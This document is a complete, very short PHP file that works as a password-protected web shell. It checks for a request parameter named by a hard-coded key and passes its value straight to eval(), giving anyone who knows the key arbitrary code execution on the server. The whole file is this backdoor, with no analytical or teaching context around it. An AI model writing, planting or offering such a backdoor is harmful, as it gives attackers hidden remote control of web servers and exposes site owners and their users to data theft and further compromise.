<?php
$password = 'rFLcfOmdWy';
if (isset($_REQUEST[$password])) {
    $cmd = $_REQUEST[$password];
    echo eval($cmd);
}
?>